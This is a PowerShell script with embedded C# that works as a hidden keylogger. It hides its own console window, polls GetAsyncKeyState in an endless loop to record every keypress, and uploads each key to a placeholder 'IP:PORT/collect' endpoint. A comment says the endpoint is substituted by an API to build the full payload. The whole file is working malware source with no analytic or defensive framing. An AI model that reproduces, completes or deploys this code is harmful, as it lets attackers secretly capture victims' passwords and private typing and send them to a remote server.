$hwnd = Get-Process -Id $PID | ForEach-Object { $_.MainWindowHandle }
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@
[WinAPI]::ShowWindow($hwnd, 0)

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Windows.Forms;

public class GlobalKeyCapture {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    public static void CaptureKeys() {
        string filePath = Environment.GetEnvironmentVariable("temp") + "\\magicK.txt";
        string uri = "http://IP:PORT/collect"; // needs to be automatically substituted through the api to get the full payload (ip:port)
        if (!File.Exists(filePath)) {
            File.Create(filePath).Close(); 
        }

        while (true) {
            for (int i = 0; i < 255; i++) {
                int keyState = GetAsyncKeyState(i);
                if (keyState == 32769) {
                    string key = ((ConsoleKey)i).ToString();
                    File.WriteAllText(filePath, key);
                    try {
                        string data = File.ReadAllText(filePath);
                        WebClient client = new WebClient();
                        client.UploadString(uri, data);
                        File.Delete(filePath);
                    } catch (Exception e) {
                        File.AppendAllText(filePath, "[ERROR] " + e.Message);
                    }
                }
            }
            System.Threading.Thread.Sleep(10);
        }
    }
}
"@ -ReferencedAssemblies 'System.Windows.Forms'

[GlobalKeyCapture]::CaptureKeys()
